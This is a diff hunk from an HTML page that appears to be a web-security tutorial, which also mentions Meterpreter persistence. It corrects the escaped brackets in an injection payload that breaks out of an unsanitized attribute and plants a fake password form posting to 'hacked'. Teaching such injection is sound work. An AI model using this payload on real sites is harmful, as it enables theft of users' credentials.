@@ -76,7 +76,7 @@ Deploying a Meterpreter shell is one way to create a well obfuscated persisitent
 		So , now knowing the context and the fact that there is no encoding or sanitization defense, we do this.
 	</p>
 		<pre>
-';"&lt&gtform action='hacked'&lt&gtinput type='password' name='password' placeholder='password'/&lt&gtinput name='name' placeholder='name'/&lt&gtinput type='submit'/&lt&gtlt/form&gt&lt!--
+';"&gt&ltform action='hacked'&gt&ltinput type='password' name='password' placeholder='password'/&lt&gtinput name='name' placeholder='name'/&gt&ltinput type='submit'/&gt&lt/form&gt&lt!--
 		</pre>
 	</p>
 	</li>
